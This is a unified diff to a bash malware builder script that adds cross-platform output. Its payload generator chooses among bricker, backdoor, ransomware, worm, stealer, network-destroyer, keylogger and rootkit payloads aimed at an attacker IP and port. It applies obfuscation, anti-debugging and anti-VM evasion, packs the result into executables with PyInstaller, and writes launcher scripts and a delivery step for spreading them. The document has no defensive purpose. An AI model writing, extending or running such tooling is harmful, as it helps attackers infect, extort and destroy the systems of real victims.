@@ -66,7 +66,7 @@ declare -A DELIVERY_METHODS=(
 )
 
 # Global variables
-SCRIPT_VERSION="7.8-Cloudflare-HTTPS-Fixed"
+SCRIPT_VERSION="7.8-Cloudflare-HTTPS-Fixed-CrossPlatform"
 BUILD_TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
 BUILD_ID=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 8)
 
@@ -767,59 +767,265 @@ generate_payload() {
     
     local encryption_key=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 32)
     
-    case $type in
-        1) create_bricker_payload "$attacker_ip" "$attacker_port" "$encryption_key" ;;
-        2) create_backdoor_payload "$attacker_ip" "$attacker_port" "$encryption_key" ;;
-        3) create_ransomware_payload "$attacker_ip" "$attacker_port" "$encryption_key" ;;
-        4) create_worm_payload "$attacker_ip" "$attacker_port" "$encryption_key" ;;
-        5) create_stealer_payload "$attacker_ip" "$attacker_port" "$encryption_key" ;;
-        6) create_network_destroyer_payload "$attacker_ip" "$attacker_port" "$encryption_key" ;;
-        7) create_keylogger_payload "$attacker_ip" "$attacker_port" "$encryption_key" ;;
-        8) create_rootkit_payload "$attacker_ip" "$attacker_port" "$encryption_key" ;;
-        9) create_custom_payload "$attacker_ip" "$attacker_port" "$encryption_key" ;;
-        *)
-            echo -e "${R}[!] Invalid payload type selected.${NC}"
-            log_message "ERROR" "Invalid payload type: $type"
-            return 1
-            ;;
-    esac
-    
-    [ "$OBFUSCATION_LEVEL" -gt 1 ] && apply_obfuscation "$OBFUSCATION_LEVEL"
-    [ "$ANTI_DEBUG_ENABLED" = true ] && apply_anti_debug
-    [ "$ANTI_VM_ENABLED" = true ] && apply_anti_vm
-    
-    echo -e "${Y}[*] Compiling to a standalone executable for $target_os...${NC}"
-    
-    local pyinstaller_args="--onefile --name=$final_name"
-    
-    [ "$target_os" == "Windows" ] && pyinstaller_args="$pyinstaller_args --noconsole --windowed --icon=NONE" || pyinstaller_args="$pyinstaller_args --console"
-    
-    pyinstaller_args="$pyinstaller_args --strip --clean"
-    
-    [ "$PACKER_ENABLED" = true ] && case $PACKING_METHOD in
-        1) pyinstaller_args="$pyinstaller_args --upx-dir=." ;;
-        2) pyinstaller_args="$pyinstaller_args --runtime-hookdir=." ;;
-        3) pyinstaller_args="$pyinstaller_args --custom-bootstrap" ;;
-    esac
-    
-    if ! pyinstaller $pyinstaller_args payload.py; then
-        echo -e "${R}[!] PyInstaller compilation failed.${NC}"
-        log_message "ERROR" "PyInstaller compilation failed"
-        return 1
-    fi
+    # Handle cross-platform payload generation
+    if [ "$target_os" == "Cross-platform" ]; then
+        echo -e "${Y}[*] Generating cross-platform payload...${NC}"
+        
+        # Create a directory for cross-platform builds
+        mkdir -p "../cross_platform_builds"
+        
+        # Generate for each platform
+        local platforms=("Windows" "Linux" "macOS")
+        local platform_names=("pc.exe" "pc_linux" "pc_macos")
+        local success_count=0
+        
+        for i in "${!platforms[@]}"; do
+            local platform="${platforms[$i]}"
+            local platform_name="${platform_names[$i]}"
+            
+            echo -e "${Y}[*] Building for $platform...${NC}"
+            
+            # Create platform-specific payload
+            case $type in
+                1) create_bricker_payload "$attacker_ip" "$attacker_port" "$encryption_key" ;;
+                2) create_backdoor_payload "$attacker_ip" "$attacker_port" "$encryption_key" ;;
+                3) create_ransomware_payload "$attacker_ip" "$attacker_port" "$encryption_key" ;;
+                4) create_worm_payload "$attacker_ip" "$attacker_port" "$encryption_key" ;;
+                5) create_stealer_payload "$attacker_ip" "$attacker_port" "$encryption_key" ;;
+                6) create_network_destroyer_payload "$attacker_ip" "$attacker_port" "$encryption_key" ;;
+                7) create_keylogger_payload "$attacker_ip" "$attacker_port" "$encryption_key" ;;
+                8) create_rootkit_payload "$attacker_ip" "$attacker_port" "$encryption_key" ;;
+                9) create_custom_payload "$attacker_ip" "$attacker_port" "$encryption_key" ;;
+                *)
+                    echo -e "${R}[!] Invalid payload type selected.${NC}"
+                    log_message "ERROR" "Invalid payload type: $type"
+                    return 1
+                    ;;
+            esac
+            
+            [ "$OBFUSCATION_LEVEL" -gt 1 ] && apply_obfuscation "$OBFUSCATION_LEVEL"
+            [ "$ANTI_DEBUG_ENABLED" = true ] && apply_anti_debug
+            [ "$ANTI_VM_ENABLED" = true ] && apply_anti_vm
+            
+            # Compile for the specific platform
+            local pyinstaller_args="--onefile --name=$platform_name"
+            
+            if [ "$platform" == "Windows" ]; then
+                pyinstaller_args="$pyinstaller_args --noconsole --windowed --icon=NONE"
+            else
+                pyinstaller_args="$pyinstaller_args --console"
+            fi
+            
+            pyinstaller_args="$pyinstaller_args --strip --clean"
+            
+            [ "$PACKER_ENABLED" = true ] && case $PACKING_METHOD in
+                1) pyinstaller_args="$pyinstaller_args --upx-dir=." ;;
+                2) pyinstaller_args="$pyinstaller_args --runtime-hookdir=." ;;
+                3) pyinstaller_args="$pyinstaller_args --custom-bootstrap" ;;
+            esac
+            
+            if pyinstaller $pyinstaller_args payload.py; then
+                if [ -f "dist/$platform_name" ]; then
+                    local file_size=$(stat -f%z "dist/$platform_name" 2>/dev/null || stat -c%s "dist/$platform_name")
+                    local size_mb=$(echo "scale=2; $file_size / 1048576" | bc)
+                    local file_hash=$(sha256sum "dist/$platform_name" | cut -d' ' -f1)
+                    
+                    echo -e "${G}[+] Success! $platform payload created as 'dist/$platform_name' (${size_mb} MB).${NC}"
+                    
+                    # Move to cross-platform directory
+                    mv "dist/$platform_name" "../cross_platform_builds/"
+                    
+                    # Create metadata for this platform
+                    local metadata_file="../cross_platform_builds/${platform_name}.meta"
+                    cat > "$metadata_file" << EOF
+Payload Type: $type
+Target OS: $platform
+Build ID: $BUILD_ID
+Timestamp: $BUILD_TIMESTAMP
+File Size: $file_size bytes
+SHA256: $file_hash
+Encryption Algorithm: $ENCRYPTION_ALGORITHM
+Obfuscation Level: $OBFUSCATION_LEVEL
+Persistence Method: $PERSISTENCE_METHOD
+Anti-Debug Enabled: $ANTI_DEBUG_ENABLED
+Anti-VM Enabled: $ANTI_VM_ENABLED
+Packer Enabled: $PACKER_ENABLED
+Packing Method: $PACKING_METHOD
+Shellcode Injection: $SHELLCODE_INJECTION
+Process Hollowing: $PROCESS_HOLLOWING
+Runtime Decryption: $RUNTIME_DECRYPTION
+Delivery Method: $DELIVERY_METHOD
+EOF
+                    
+                    success_count=$((success_count + 1))
+                    log_message "SUCCESS" "Successfully created $platform executable: $platform_name (${size_mb} MB, SHA256: $file_hash)"
+                fi
+            else
+                echo -e "${R}[!] Failed to create $platform executable.${NC}"
+                log_message "ERROR" "Failed to create $platform executable"
+            fi
+        done
+        
+        # Create a master launcher script for cross-platform deployment
+        cat > "../cross_platform_builds/launcher.sh" << 'EOF'
+#!/bin/bash
+# Cross-platform launcher script
+# Detects the OS and runs the appropriate payload
 
-    if [ -f "dist/$final_name" ]; then
-        local file_size=$(stat -f%z "dist/$final_name" 2>/dev/null || stat -c%s "dist/$final_name")
-        local size_mb=$(echo "scale=2; $file_size / 1048576" | bc)
-        local file_hash=$(sha256sum "dist/$final_name" | cut -d' ' -f1)
+# Get the directory where this script is located
+SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
+
+# Detect the operating system
+OS="unknown"
+if [[ "$OSTYPE" == "linux-gnu"* ]]; then
+    OS="linux"
+elif [[ "$OSTYPE" == "darwin"* ]]; then
+    OS="macos"
+elif [[ "$OSTYPE" == "cygwin" ]] || [[ "$OSTYPE" == "msys" ]] || [[ "$OSTYPE" == "win32" ]]; then
+    OS="windows"
+fi
+
+# Execute the appropriate payload based on the detected OS
+case $OS in
+    "linux")
+        if [ -f "$SCRIPT_DIR/pc_linux" ]; then
+            chmod +x "$SCRIPT_DIR/pc_linux"
+            "$SCRIPT_DIR/pc_linux" "$@"
+        else
+            echo "Linux payload not found"
+            exit 1
+        fi
+        ;;
+    "macos")
+        if [ -f "$SCRIPT_DIR/pc_macos" ]; then
+            chmod +x "$SCRIPT_DIR/pc_macos"
+            "$SCRIPT_DIR/pc_macos" "$@"
+        else
+            echo "macOS payload not found"
+            exit 1
+        fi
+        ;;
+    "windows")
+        if [ -f "$SCRIPT_DIR/pc.exe" ]; then
+            "$SCRIPT_DIR/pc.exe" "$@"
+        else
+            echo "Windows payload not found"
+            exit 1
+        fi
+        ;;
+    *)
+        echo "Unsupported operating system: $OSTYPE"
+        exit 1
+        ;;
+esac
+EOF
         
-        echo -e "${G}[+] Success! Payload created as 'dist/$final_name' (${size_mb} MB).${NC}"
-        echo -e "${G}[+] SHA256: $file_hash${NC}"
+        chmod +x "../cross_platform_builds/launcher.sh"
         
-        mv "dist/$final_name" ..
+        # Create a Windows batch file launcher
+        cat > "../cross_platform_builds/launcher.bat" << 'EOF'
+@echo off
+REM Cross-platform launcher for Windows
+REM Detects if running on Windows and runs the appropriate payload
+
+REM Get the directory where this script is located
+set SCRIPT_DIR=%~dp0
+
+REM Run the Windows executable
+if exist "%SCRIPT_DIR%pc.exe" (
+    start "" "%SCRIPT_DIR%pc.exe" %*
+) else (
+    echo Windows payload not found
+    pause
+    exit /b 1
+)
+EOF
         
-        local metadata_file="../${final_name}.meta"
-        cat > "$metadata_file" << EOF
+        # Create a summary file
+        cat > "../cross_platform_builds/README.txt" << EOF
+CROSS-PLATFORM PAYLOAD BUILD SUMMARY
+====================================
+Build ID: $BUILD_ID
+Timestamp: $BUILD_TIMESTAMP
+Payload Type: $type
+Successfully Built: $success_count/3 platforms
+
+Files:
+- launcher.sh: Unix/Linux/macOS launcher script
+- launcher.bat: Windows batch launcher
+- pc.exe: Windows executable
+- pc_linux: Linux executable
+- pc_macos: macOS executable
+
+Usage:
+1. On Unix/Linux/macOS: ./launcher.sh
+2. On Windows: launcher.bat
+
+Each platform-specific executable can also be run directly.
+EOF
+        
+        echo -e "${G}[+] Cross-platform build complete!${NC}"
+        echo -e "${G}[+] Successfully built $success_count/3 platforms.${NC}"
+        echo -e "${G}[+] All files are in the 'cross_platform_builds' directory.${NC}"
+        echo -e "${G}[+] Use launcher.sh (Unix) or launcher.bat (Windows) for deployment.${NC}"
+        
+        log_message "SUCCESS" "Cross-platform build completed: $success_count/3 platforms"
+        return 0
+    else
+        # Single platform payload generation (original code)
+        case $type in
+            1) create_bricker_payload "$attacker_ip" "$attacker_port" "$encryption_key" ;;
+            2) create_backdoor_payload "$attacker_ip" "$attacker_port" "$encryption_key" ;;
+            3) create_ransomware_payload "$attacker_ip" "$attacker_port" "$encryption_key" ;;
+            4) create_worm_payload "$attacker_ip" "$attacker_port" "$encryption_key" ;;
+            5) create_stealer_payload "$attacker_ip" "$attacker_port" "$encryption_key" ;;
+            6) create_network_destroyer_payload "$attacker_ip" "$attacker_port" "$encryption_key" ;;
+            7) create_keylogger_payload "$attacker_ip" "$attacker_port" "$encryption_key" ;;
+            8) create_rootkit_payload "$attacker_ip" "$attacker_port" "$encryption_key" ;;
+            9) create_custom_payload "$attacker_ip" "$attacker_port" "$encryption_key" ;;
+            *)
+                echo -e "${R}[!] Invalid payload type selected.${NC}"
+                log_message "ERROR" "Invalid payload type: $type"
+                return 1
+                ;;
+        esac
+        
+        [ "$OBFUSCATION_LEVEL" -gt 1 ] && apply_obfuscation "$OBFUSCATION_LEVEL"
+        [ "$ANTI_DEBUG_ENABLED" = true ] && apply_anti_debug
+        [ "$ANTI_VM_ENABLED" = true ] && apply_anti_vm
+        
+        echo -e "${Y}[*] Compiling to a standalone executable for $target_os...${NC}"
+        
+        local pyinstaller_args="--onefile --name=$final_name"
+        
+        [ "$target_os" == "Windows" ] && pyinstaller_args="$pyinstaller_args --noconsole --windowed --icon=NONE" || pyinstaller_args="$pyinstaller_args --console"
+        
+        pyinstaller_args="$pyinstaller_args --strip --clean"
+        
+        [ "$PACKER_ENABLED" = true ] && case $PACKING_METHOD in
+            1) pyinstaller_args="$pyinstaller_args --upx-dir=." ;;
+            2) pyinstaller_args="$pyinstaller_args --runtime-hookdir=." ;;
+            3) pyinstaller_args="$pyinstaller_args --custom-bootstrap" ;;
+        esac
+        
+        if ! pyinstaller $pyinstaller_args payload.py; then
+            echo -e "${R}[!] PyInstaller compilation failed.${NC}"
+            log_message "ERROR" "PyInstaller compilation failed"
+            return 1
+        fi
+
+        if [ -f "dist/$final_name" ]; then
+            local file_size=$(stat -f%z "dist/$final_name" 2>/dev/null || stat -c%s "dist/$final_name")
+            local size_mb=$(echo "scale=2; $file_size / 1048576" | bc)
+            local file_hash=$(sha256sum "dist/$final_name" | cut -d' ' -f1)
+            
+            echo -e "${G}[+] Success! Payload created as 'dist/$final_name' (${size_mb} MB).${NC}"
+            echo -e "${G}[+] SHA256: $file_hash${NC}"
+            
+            mv "dist/$final_name" ..
+            
+            local metadata_file="../${final_name}.meta"
+            cat > "$metadata_file" << EOF
 Payload Type: $type
 Target OS: $target_os
 Build ID: $BUILD_ID
@@ -838,13 +1044,14 @@ Process Hollowing: $PROCESS_HOLLOWING
 Runtime Decryption: $RUNTIME_DECRYPTION
 Delivery Method: $DELIVERY_METHOD
 EOF
-        
-        log_message "SUCCESS" "Successfully created executable: $final_name (${size_mb} MB, SHA256: $file_hash)"
-        return 0
-    else
-        echo -e "${R}[!] Failed to create executable. Check for errors above.${NC}"
-        log_message "ERROR" "Failed to create executable"
-        return 1
+            
+            log_message "SUCCESS" "Successfully created executable: $final_name (${size_mb} MB, SHA256: $file_hash)"
+            return 0
+        else
+            echo -e "${R}[!] Failed to create executable. Check for errors above.${NC}"
+            log_message "ERROR" "Failed to create executable"
+            return 1
+        fi
     fi
 }
 
@@ -1576,14 +1783,25 @@ main() {
     setup_environment
     
     if generate_payload "$PAYLOAD_TYPE" "$ATTACKER_IP" "$ATTACKER_PORT" "$TARGET_OS" "$FINAL_NAME"; then
-        echo -e "${G}>> PAYLOAD GENERATION COMPLETE. Check the parent directory for '$FINAL_NAME'.${NC}"
-        echo -e "${G}>> Metadata saved as '${FINAL_NAME}.meta'${NC}"
-        log_message "SUCCESS" "Payload generation completed successfully"
+        if [ "$TARGET_OS" == "Cross-platform" ]; then
+            echo -e "${G}>> CROSS-PLATFORM PAYLOAD GENERATION COMPLETE. Check the 'cross_platform_builds' directory.${NC}"
+            echo -e "${G}>> Use launcher.sh (Unix) or launcher.bat (Windows) for deployment.${NC}"
+            log_message "SUCCESS" "Cross-platform payload generation completed successfully"
+        else
+            echo -e "${G}>> PAYLOAD GENERATION COMPLETE. Check the parent directory for '$FINAL_NAME'.${NC}"
+            echo -e "${G}>> Metadata saved as '${FINAL_NAME}.meta'${NC}"
+            log_message "SUCCESS" "Payload generation completed successfully"
+        fi
         
         # If delivery method is specified, deliver the payload
         if [ -n "$DELIVERY_METHOD" ]; then
             # Get the full path to the payload
-            local payload_full_path="$(pwd)/../$FINAL_NAME"
+            local payload_full_path
+            if [ "$TARGET_OS" == "Cross-platform" ]; then
+                payload_full_path="$(pwd)/../cross_platform_builds"
+            else
+                payload_full_path="$(pwd)/../$FINAL_NAME"
+            fi
             
             if deliver_payload "$payload_full_path" "$DELIVERY_METHOD" "$DELIVERY_TARGETS"; then
                 echo -e "${G}>> DELIVERY COMPLETE.${NC}"
